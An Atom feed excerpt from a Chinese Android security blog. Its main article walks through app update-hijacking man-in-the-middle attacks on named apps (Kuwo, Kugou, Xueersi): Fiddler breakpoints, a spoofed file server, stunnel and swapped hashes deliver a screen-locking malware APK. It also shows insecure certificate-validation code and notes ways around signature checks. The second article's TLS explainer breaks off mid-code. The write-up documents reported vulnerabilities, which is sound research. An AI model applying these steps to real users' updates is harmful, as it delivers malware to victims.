    <summary type="html">&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;验证码漏洞也是当下十分常见的APP端漏洞，本文对验证码漏洞原理做了一个初步的讲解，并复现了当下一些常见的验证码相关的漏洞，本文App抓包技术参考了肉丝大佬的书籍安卓Frida逆向和抓包实战&lt;/p&gt;</summary>
    
    
    
    <category term="Android APP漏洞之战" scheme="http://security-kitchen.com/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://security-kitchen.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="工具" scheme="http://security-kitchen.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Android App漏洞之战（16）——通信漏洞的案例实操</title>
    <link href="http://security-kitchen.com/2023/02/14/bug0016/"/>
    <id>http://security-kitchen.com/2023/02/14/bug0016/</id>
    <published>2023-02-14T01:02:19.000Z</published>
    <updated>2023-12-23T09:13:44.113Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h2><span id="more"></span><h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">APP升级劫持漏洞是最常见的通用型逻辑缺陷漏洞，攻击者一般通过劫持APP升级的响应，通过伪造和篡改的方式来实现中间人攻击，从而向应用中注入恶意程序</span><br><span class="line">CNVD-2021-40179和CNVD-2021-45684便是采用中间人劫持攻击，来实现APP的恶意劫持替换</span><br><span class="line">现在市面上常用的APP,基本采用http明文传输——&gt;https加密传输——&gt;http/https+hash校验三种方式，我们依次对酷我音乐、酷狗音乐、学而思网校等主流APP做漏洞测试，来描述中间人攻击的具体实现</span><br></pre></td></tr></table></figure><h2 id="二、原理解析"><a href="#二、原理解析" class="headerlink" title="二、原理解析"></a>二、原理解析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">中间人攻击（MITM）是指攻击者与通讯的两端分别独立的联系，并交换其所收到的数据，使得通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都会被攻击者完全控制</span><br><span class="line">在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/0.png" alt="avatar"></p><p>客户端不验证服务器是否可信，即checkServerTrusted()方法为空</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public void checkClientTrusted(X509Certificate[] chain, String authType)&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不检查站点域名与站点证书的域名是否匹配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HostnameVerifier hv = new HostnameVerifier()&#123;</span><br><span class="line">@Override</span><br><span class="line">public boolean verify(String hostname,SSLSession session)&#123;</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接收任意域名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SSLSocketFactory sf;</span><br><span class="line">......</span><br><span class="line">sf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER)</span><br></pre></td></tr></table></figure><h2 id="二、实验准备"><a href="#二、实验准备" class="headerlink" title="二、实验准备"></a>二、实验准备</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Fiddler</span><br><span class="line">夜神模拟器（有条件的最好用真机）</span><br><span class="line">HFS文件服务器</span><br><span class="line">Stunnel</span><br><span class="line">恶意锁机样本——Wifikillpro.apk</span><br></pre></td></tr></table></figure><h2 id="三、实验步骤"><a href="#三、实验步骤" class="headerlink" title="三、实验步骤"></a>三、实验步骤</h2><h3 id="1-http明文传输升级劫持——以酷我音乐为例（CNVD-2021-45684）"><a href="#1-http明文传输升级劫持——以酷我音乐为例（CNVD-2021-45684）" class="headerlink" title="1. http明文传输升级劫持——以酷我音乐为例（CNVD-2021-45684）"></a>1. http明文传输升级劫持——以酷我音乐为例（CNVD-2021-45684）</h3><p><strong>（1）Fiddler环境配置</strong></p><p>​参考链接：<a href="https://bbs.pediy.com/thread-268445.htm">Fiddler环境配置</a></p><p><strong>（2）安装酷我音乐，并抓取响应请求</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/1.png" alt="avatar"></p><p>然后，我们可以发现程序下载完成后，显示正常的升级界面</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/2.png" alt="avatar"></p><p>我们进一步分析报文的详细信息：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/3.png" alt="avatar"></p><p>我们可以知道这条请求就是程序的下载请求，对应的就是下载的apk，我们尝试劫持这条请求，将apk替换成我们的恶意锁机程序</p><p><strong>（3）劫持攻击</strong></p><p>​1）下劫持响应请求断点，可以让我们在劫持特定的请求响应</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这里我总结集中常见的指令：</span><br><span class="line">bpu+URL:    中断特定URL的全部session请求报文</span><br><span class="line">bpafter+URL:中断特定URL的全部session响应报文</span><br><span class="line">bps+URL:    中断 HTTP 响应状态的指定URL的全部session响应</span><br><span class="line">bpv+URL:    中断指定请求方式的全部 session 响应</span><br><span class="line">bpm+URL:    中断指定请求方式的全部 session 响应。等同于bpv</span><br><span class="line">bpu/bpafter/bps/bpv/bpm  停止断点</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/4.png" alt="avatar"></p><p>​2）通过HFS文件管理服务器，来模拟请求的服务器</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/5.png" alt="avatar"></p><p>注意路径应与apk下载请求url保持一致，域名设置为我们本机的ip地址</p><p>​3）重新安装，开始升级</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/6.png" alt="avatar"></p><p>此时，我们将下载请求给劫持下来了，我们只需要更改域名为我们ip地址，再响应就可以下载我们的锁机程序了</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/7.png" alt="avatar"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/8.png" alt="avatar"></p><p>此时我们发现我们的锁机样本被用户成功的下载，用户在未知情况下打开，便被锁机了</p><h3 id="2-http-hash验证升级劫持——以酷狗音乐为例（CVND-2021-46587）"><a href="#2-http-hash验证升级劫持——以酷狗音乐为例（CVND-2021-46587）" class="headerlink" title="2. http+hash验证升级劫持——以酷狗音乐为例（CVND-2021-46587）"></a>2. http+hash验证升级劫持——以酷狗音乐为例（CVND-2021-46587）</h3><p><strong>(1) 安装酷狗音乐，抓取响应请求</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/10.png" alt="avatar"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们可以发现响应的结果中包含hash值，下载的链接，我们只需要将此响应的hash值替换成我们恶意应用的hash值，然后将下载的url劫持为我们本地的即可</span><br></pre></td></tr></table></figure><p><strong>（2）劫持升级</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/11.png" alt="avatar"></p><p>我们用文件服务器模拟该url：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/12.png" alt="avatar"></p><p>我们将主机的域名解析更改为我们本地的ip：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/13.png" alt="avatar"></p><p>我们查取我们恶意程序的hash值：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/14.png" alt="avatar"></p><p>我们劫持更新响应的url：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/15.png" alt="avatar"></p><p>开始升级替换：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/16.png" alt="avatar"></p><p>我们成功替换hash值，并点击升级：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/17.png" alt="avatar"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/18.png" alt="avatar"></p><h3 id="3-https-hash验证升级劫持——以学而思网课为例（CVND-2021-169938）"><a href="#3-https-hash验证升级劫持——以学而思网课为例（CVND-2021-169938）" class="headerlink" title="3. https+hash验证升级劫持——以学而思网课为例（CVND-2021-169938）"></a>3. https+hash验证升级劫持——以学而思网课为例（CVND-2021-169938）</h3><p><strong>（1）配置stunnel，实现https下载</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于我们的HFS文件服务器只能支持http访问，但是对于当下市面上大多是https传输，所以我们可以结合stunnel+HFS实现https访问下载</span><br></pre></td></tr></table></figure><p>stunnel配置：详细见<a href="https://bbs.pediy.com/thread-268459.htm">stunnel配置</a></p><p><strong>（2）我们劫持请求报文</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/19.png" alt="avatar"></p><p>我们将响应的报文保存下来，并修改其对应的MD5值</p><p><strong>（3） 我们用HFS模拟下载的URL链接</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/20.png" alt="avatar"></p><p><strong>（4） 由于是采用https传输，我们需要借助工具stunnel，才能实现https传输</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/21.png" alt="avatar"></p><p>我们配置好后，就可以https访问了</p><p><strong>（5）我们进行截获</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/22.png" alt="avatar"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/23.png" alt="avatar"></p><p>​重新启动，我们发现可以升级截获成功</p><h2 id="四、实验总结"><a href="#四、实验总结" class="headerlink" title="四、实验总结"></a>四、实验总结</h2><p>我们总结了当下APP升级劫持攻击的常见形式，并分别对三种不同形式的升级劫持攻击做了一个具体的案例描述，可以发现都是通过抓包劫持替换实现的，恶意攻击者可以在用户手机中安装证书，就可以使用http&#x2F;https中间人攻击，来劫持升级报文。我们可以发现当下大部分主流的APP都存在这种漏洞，并以此对提交的三个漏洞做了一个讲解，对于一些其他的APP，通常采用加密算法加密，这样获取报文的情况较难。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;一、漏洞介绍&quot;&gt;&lt;a href=&quot;#一、漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;一、漏洞介绍&quot;&gt;&lt;/a&gt;一、漏洞介绍&lt;/h2&gt;</summary>
    
    
    
    <category term="Android APP漏洞之战" scheme="http://security-kitchen.com/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://security-kitchen.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="工具" scheme="http://security-kitchen.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Android App漏洞之战（15）——Https（http）通信漏洞详解</title>
    <link href="http://security-kitchen.com/2023/02/14/bug0015/"/>
    <id>http://security-kitchen.com/2023/02/14/bug0015/</id>
    <published>2023-02-14T01:01:19.000Z</published>
    <updated>2023-12-23T09:13:44.113Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>本文主要介绍Android http&#x2F;https方面的安全漏洞问题，并会从原理并结合案例来逐一讲解，本文一部分参考网络上一些博客，并在相应部分给出链接</p><p>本文第二节主要讲述Android http&#x2F;https相关的基础知识</p><p>本文第三节为漏洞原理解析和漏洞复现</p><p>本文第四节为Android https转包漏洞介绍</p><span id="more"></span><h2 id="二、基础知识"><a href="#二、基础知识" class="headerlink" title="二、基础知识"></a>二、基础知识</h2><h3 id="1-加密算法"><a href="#1-加密算法" class="headerlink" title="1.加密算法"></a>1.加密算法</h3><h4 id="（1）对称加密"><a href="#（1）对称加密" class="headerlink" title="（1）对称加密"></a>（1）对称加密</h4><p>对称加密算法是双方都持有相同的密钥进行通信，加密速度很快</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/1.png" alt="image-20211204145051628"></p><p>特点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a.加密和解密都是用同一个秘钥</span><br><span class="line">b.加密、解密效率高</span><br><span class="line">c.秘钥被窃取，容易造成数据不安全</span><br><span class="line">常见的对称加密算法有DES、3DES、AES等，这里我们就不深入讲解了</span><br></pre></td></tr></table></figure><p>缺点：</p><p>上面的对称加密模型最大的问题就是，对称加密模型需要一个安全的信道来传输对称密钥，但是如果真的存在一个真正安全的信道，那直接用这个信道来传输数据就可以了，这就有点矛盾了</p><h4 id="（2）非对称加密"><a href="#（2）非对称加密" class="headerlink" title="（2）非对称加密"></a>（2）非对称加密</h4><p>非对称加密，是为了解决对称加密中的安全问题而诞生，含有一对密钥：公钥和私钥，发送方用公钥进行加密，公钥可以被公开，接收方用私钥进行解密，私钥不可公开</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/2.png" alt="image-20211204150154475"></p><p>特点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a.用公钥加密用私钥解密</span><br><span class="line">b.加密、解密相对于对称加密效率更低，但是比对称加密更安全</span><br><span class="line">c.公钥可能被中间人伪造，造成数据不安全</span><br><span class="line">常见的非对称加密算法有RSA、DSA等</span><br></pre></td></tr></table></figure><p>缺点：</p><p>如何保证加密的是接收方的公钥，如何安全的传输公钥</p><h3 id="2-信息安全问题"><a href="#2-信息安全问题" class="headerlink" title="2.信息安全问题"></a>2.信息安全问题</h3><p>我们在传输数据的过程中往往着眼于三个方面的安全问题：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）信息的保密性</span><br><span class="line">（<span class="number">2</span>）信息的完整性</span><br><span class="line">（<span class="number">3</span>）身份识别</span><br></pre></td></tr></table></figure><h4 id="（1）信息的保密性"><a href="#（1）信息的保密性" class="headerlink" title="（1）信息的保密性"></a>（1）信息的保密性</h4><p>我们一般会使用各种加密算法对我们传输的数据信息进行加密，即使用上面的对称加密和非对称加密来完成，但无论是对称加密还是非对称加密都存在一个共同的安全问题：<code>密钥如何传递，而且提高传输速率</code>，一般公用的方法是采用<code>对称加密+非对称加密结合</code>，即双方都在使用对称加密进行传输，但是会存在密钥不能保证安全性的问题，此时我们使用公钥对对称密钥进行加密，然后接收方使用私钥对对称密钥进行解密，这样就可以解决这个问题</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/3.png" alt="image-20211204151540175"></p><h4 id="（2）信息的完整性（数字签名）"><a href="#（2）信息的完整性（数字签名）" class="headerlink" title="（2）信息的完整性（数字签名）"></a>（2）信息的完整性（数字签名）</h4><p>数据在传输的过程中，我们的信息可能被第三方劫持篡改，所以我们要保证信息的完整性，一般通过使用散列函数如SHA1，MD5将传输内容hash依次获得hash值，即摘要。客户端使用服务端的公钥对摘要和信息内容进行加密，传输给服务端，服务端使用私钥进行解密，然后用相同的hash算法对原始内容进行hash，然后与摘要值对比，如果一直，说明信息是完整的</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/4.png" alt="image-20211204152606806"></p><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Android APP应用一般就具有签名验证机制，以防止恶意攻击者在对APP进行逆向之后，重打包，一般来说Android APP的签名机制分为3类：</span><br><span class="line">（1）java本地验证，在java代码中有hash函数验证，我们通常搜索signature定位到目标代码段，直接删除或hook该代码段即可</span><br><span class="line">（2）so本地验证，为了加强逆向难度，很多公司会将APP验证写在so层，这一般我们通过IDA动态调试，获取代码段然后NOP即可</span><br><span class="line">（3）网络服务器验证，一般来说这种进行网络hash验证，一般这种通过抓包，但有一些加密后变很难处理了</span><br></pre></td></tr></table></figure><h4 id="（3）身份识别（数字证书）"><a href="#（3）身份识别（数字证书）" class="headerlink" title="（3）身份识别（数字证书）"></a>（3）身份识别（数字证书）</h4><p>我们在信息传输过程中，通常要验证信息的发送方的身份，我们将发送端的公钥发送给接收端，发送端通过把自己的内容使用私钥加密然后发送给接收端，接收端只能使用发送端的公钥加密，自然就验证了发送端的身份</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/5.png" alt="image-20211204154251711"></p><p>数字证书：</p><p>但是上述过程中存在一个问题，在传输的过程中，客户端如何获得服务器的公钥呢？当服务器分发给客户端，如果一开始服务端发送的公钥到客户端就被第三方劫持，然后第三方自己伪造一对密钥，将公钥发送给客户端，当服务端发生数据给客户端的时候，中间人就将信息劫持，用一开始劫持的公钥进行解密，然后将自己的私钥将数据发送给客户端，而客户端收到后使用公钥解密，这个过程中中间人是透明的，就可以获取信息了</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/6.png" alt="image-20211204162208265"></p><p>为了防止这种中间人攻击，数字证书就出现了，其实是基于上面所说的私钥加密数据，公钥解密来验证其身份</p><p>数字证书是由权威的CA（Certificate Authority）机构给服务端进行颁发，CA机构通过服务端提供的相关信息生成证书，证书内容包含了持有人的相关信息，服务器的公钥，签署者签名信息（数字签名）等，最重要的是公钥在数字证书中</p><p>数字证书由权威的CA（Certificate Authority）机构给服务端进行颁发，CA机构通过服务端提供的相关信息生成证书，证书内容包含了持有人的相关信息，服务器的公钥，签署者签名信息（数字签名）等，最重要的是<code>公钥在数字证书</code>中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(1)数字证书是如何保证公钥来自于请求的服务器呢？</span><br><span class="line">数字证书上由持有人的相关信息，通过这点可以确定其不是一个中间人</span><br><span class="line">(2)如何保证数字证书为真呢？</span><br><span class="line">一个证书中含有三个部分:&quot;证书内容，散列算法，加密密文&quot;，证书内容会被散列算法hash计算出hash值，然后使用CA机构提供的私钥进行RSA加密</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/7.png" alt="image-20211204162925136"></p><p>客户端完成验证过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当客户端发起请求是，服务端将该数字证书发送到客户端，客户端通过CA机构提供的公钥对加密密文来进行解密获得散列值（数字签名），同时将证书内容使用相同的散列算法进行Hash得到另一个散列值，比对两个散列值，如果两者相等则说明证书没问题</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/8.png" alt="image-20211204163230226"></p><p>一些常见的证书分类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">X.509#DER 二进制格式证书，常用后缀.cer .crt</span><br><span class="line">X.509#PEM 文本格式证书，常用后缀.pem</span><br><span class="line">有的证书内容是只包含公钥（服务器的公钥），如.crt、.cer、.pem</span><br><span class="line">有的证书既包含公钥又包含私钥（服务器的私钥），如.pfx、.p12</span><br></pre></td></tr></table></figure><p>为了保证证书的一致性，国际电信联盟设计了一套专门针对证书格式的标准X.509，其核心提供了一种描述证书的格式</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/9.png" alt="image-20211204163230226"></p><h3 id="3-Http-x2F-Https详解"><a href="#3-Http-x2F-Https详解" class="headerlink" title="3.Http&#x2F;Https详解"></a>3.Http&#x2F;Https详解</h3><h4 id="（1）TLS-x2F-SSL"><a href="#（1）TLS-x2F-SSL" class="headerlink" title="（1）TLS&#x2F;SSL"></a>（1）TLS&#x2F;SSL</h4><p>http:超文本传输协议，采用明文的方式去传输数据，经过我们上文的分析，在这个过程中很容易导致中间人攻击，因此为了进一步增强数据传输的安全性，开始出现https，而在此之前我们就需要了解一下TLS&#x2F;SSL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SSL：（Secure Socket Layer，安全套接字层），位于可靠的面向连接的网络层协议和应用层协议之间的一种协议层。SSL通过互相认证、使用数字签名确保完整性、使用加密确保私密性，以实现客户端和服务器之间的安全通讯</span><br><span class="line">TLS：(Transport Layer Security，传输层安全协议)，用于两个应用程序之间提供保密性和数据完整性</span><br></pre></td></tr></table></figure><p>我们先看一下SSL和TLS的区别：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">简而言之，TLS只是SSL后来迭代的版本而已，在1994年，NetScape设计了SSL协议，1999年，互联网标准化组织ISOC接替NetScape公司，发布了SSL的升级版TLS 1.0版，因此可以理解为TLS 1.0 = SSL 3.1，只是SSL后来的的版本而已</span><br></pre></td></tr></table></figure><p>SSL协议即用到了对称加密也用到了非对称加密(公钥加密)，在建立传输链路时，SSL首先对对称加密的密钥使用公钥进行非对称加密，链路建立好之后，SSL对传输内容使用对称加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.对称加密</span><br><span class="line">速度高，可加密内容较大，用来加密会话过程中的消息</span><br><span class="line"></span><br><span class="line">2.公钥加密</span><br><span class="line">加密速度较慢，但能提供更好的身份认证技术，用来加密对称加密的密钥</span><br></pre></td></tr></table></figure><p>因此，HTTPs &#x3D; HTTP + TLS&#x2F;SSL</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/10.png" alt="image-20211204165055568"></p><h4 id="（2）HTTPs的单向认证和双向认证"><a href="#（2）HTTPs的单向认证和双向认证" class="headerlink" title="（2）HTTPs的单向认证和双向认证"></a>（2）HTTPs的单向认证和双向认证</h4><h5 id="lt-1-gt-单向认证"><a href="#lt-1-gt-单向认证" class="headerlink" title="&lt;1&gt;单向认证"></a>&lt;1&gt;单向认证</h5><p>Https在建立Socket连接之前，需要进行握手，具体流程：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/11.png" alt="image-20211204165055568"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。</span><br><span class="line"><span class="number">2.</span>服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书</span><br><span class="line"><span class="number">3.</span>客户端使用服务端返回的信息验证服务器的合法性，包括：</span><br><span class="line">    (<span class="number">1</span>)证书是否过期</span><br><span class="line">    (<span class="number">2</span>)发型服务器证书的CA是否可靠</span><br><span class="line">    (<span class="number">3</span>)返回的公钥是否能正确解开返回证书中的数字签名</span><br><span class="line">    (<span class="number">4</span>)服务器证书上的域名是否和服务器的实际域名相匹配、验证通过后，将继续进行通信，否则，终止通信</span><br><span class="line"><span class="number">4.</span>客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择</span><br><span class="line"><span class="number">5.</span>服务器端在客户端提供的加密方案中选择加密程度最高的加密方式。</span><br><span class="line"><span class="number">6.</span>服务器将选择好的加密方案通过明文方式返回给客户端</span><br><span class="line"><span class="number">7.</span>客户端接收服务端返回的加密方式后，使用该加密方式生成产生随机码，用作通信过程中对称加密的密钥，使用服务端返回的公钥进行加密，将加密后的随机码发送至服务器</span><br><span class="line"><span class="number">8.</span>服务器收到客户端返回的加密信息后，使用自己的私钥进行解密，获取对称加密密钥。在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全</span><br></pre></td></tr></table></figure><h5 id="lt-2-gt-双向认证"><a href="#lt-2-gt-双向认证" class="headerlink" title="&lt;2&gt;双向认证"></a>&lt;2&gt;双向认证</h5><p>双向认证和单向认证原理基本差不多，只是除了客户端需要认证服务端以外，增加了服务端对客户端的认证，具体过程如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/12.png" alt="image-20211204165055568"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。</span><br><span class="line"><span class="number">2.</span>服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书</span><br><span class="line"><span class="number">3.</span>客户端使用服务端返回的信息验证服务器的合法性，包括：</span><br><span class="line">    (<span class="number">1</span>)证书是否过期</span><br><span class="line">    (<span class="number">2</span>)发型服务器证书的CA是否可靠</span><br><span class="line">    (<span class="number">3</span>)返回的公钥是否能正确解开返回证书中的数字签名</span><br><span class="line">    (<span class="number">4</span>)服务器证书上的域名是否和服务器的实际域名相匹配、验证通过后，将继续进行通信，否则，终止通信</span><br><span class="line"><span class="number">4.</span>服务端要求客户端发送客户端的证书，客户端会将自己的证书发送至服务端</span><br><span class="line"><span class="number">5.</span>验证客户端的证书，通过验证后，会获得客户端的公钥</span><br><span class="line"><span class="number">6.</span>客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择</span><br><span class="line"><span class="number">7.</span>服务器端在客户端提供的加密方案中选择加密程度最高的加密方式</span><br><span class="line"><span class="number">8.</span>将加密方案通过使用之前获取到的公钥进行加密，返回给客户端</span><br><span class="line"><span class="number">9.</span>客户端收到服务端返回的加密方案密文后，使用自己的私钥进行解密，获取具体加密方式，而后，产生该加密方式的随机码，用作加密过程中的密钥，使用之前从服务端证书中获取到的公钥进行加密后，发送给服务端</span><br><span class="line"><span class="number">10.</span>服务端收到客户端发送的消息后，使用自己的私钥进行解密，获取对称加密的密钥，在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全。</span><br></pre></td></tr></table></figure><h3 id="4-Android-Http网络开发"><a href="#4-Android-Http网络开发" class="headerlink" title="4.Android Http网络开发"></a>4.Android Http网络开发</h3><p>我们要学习Https通信漏洞挖掘，首先就需要掌握基本的Android http网络开发，因为开发和逆向漏洞总是相互相成的，Android 的HTTP的网络通信框架一般包括两类：第一类是原生的Android网络HTTP通信库，原生网路通信库主要通过HttpURLConnection以及HttpClient两个类完成，但是Android6.0后，Andriod中的SDK就去掉了HttpClient的支持，Android 9后，Android就直接取消了HttpClient的支持，但是由于网络通信的操作涉及异步、多线程和效率的问题，HttpURLConnection中并未对这些操作进行完整的封装，就出现第二类网络通信框架——第三方HTTP(s)的网络请求框架，一般为：okhttp、Volley等，这里我们只介绍当下使用比较广泛的框架</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/13.png" alt="image-20211205134303663"></p><h4 id="（1）HttpURLConnection"><a href="#（1）HttpURLConnection" class="headerlink" title="（1）HttpURLConnection"></a>（1）HttpURLConnection</h4><p>获取HttpURLConnection实例，通过openConnection()获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://www,baidu.com&quot;</span>);</span><br><span class="line"><span class="type">HttpURLConnection</span> <span class="variable">connection</span> 